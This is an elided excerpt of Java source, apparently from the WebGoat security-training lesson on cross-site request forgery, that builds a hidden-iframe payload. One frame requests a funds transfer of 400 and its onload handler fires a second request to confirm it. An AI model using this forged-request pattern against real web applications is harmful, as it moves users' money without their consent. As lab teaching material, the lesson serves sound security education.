...
public class CSRF extends LessonAdapter
{
	...
	protected Element makeInput(WebSession s)
	{
		...
		Input inputTitle = new Input(Input.TEXT, TITLE, "CSRF Test");
		...
		row2.addElement(item1);
				...
				+ "src=\"http://sglx481.amk.st.com:11080/WebGoat/attack?Screen=45&menu=900&transferFunds=400\" "
				+ "id=\"myFrame\" frameborder=\"1\" marginwidth=\"0\" "
				+ "marginheight=\"0\" width=\"800\" scrolling=yes height=\"300\" "
				+ "onload=\"document.getElementById('frame2').src='http://sglx481.amk.st.com:11080/WebGoat/attack?Screen=45&menu=900&transferFunds=CONFIRM';\"> "
				+ "</iframe> "
				+ "<iframe "
